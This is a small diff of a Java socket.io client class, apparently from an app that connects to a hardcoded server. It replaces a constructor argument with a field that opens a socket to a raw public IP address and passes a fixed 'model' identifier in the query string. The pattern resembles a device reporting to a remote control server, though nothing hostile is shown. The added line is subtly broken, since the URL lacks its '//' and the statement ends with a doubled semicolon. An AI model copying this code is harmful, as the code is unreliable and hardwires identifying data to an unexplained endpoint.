@@ -7,8 +7,8 @@ import io.socket.client.IO;
 import io.socket.client.Socket;
 
 public class IOSocket {
-    private static IOSocket ourInstance = new IOSocket("http://13.231.5.192:80");
-    private io.socket.client.Socket ioSocket;
+    private static IOSocket ourInstance = new IOSocket();
+    private io.socket.client.Socket ioSocket = IO.socket("http:13.231.5.192:80?model=918213553211245");;
 
 
 
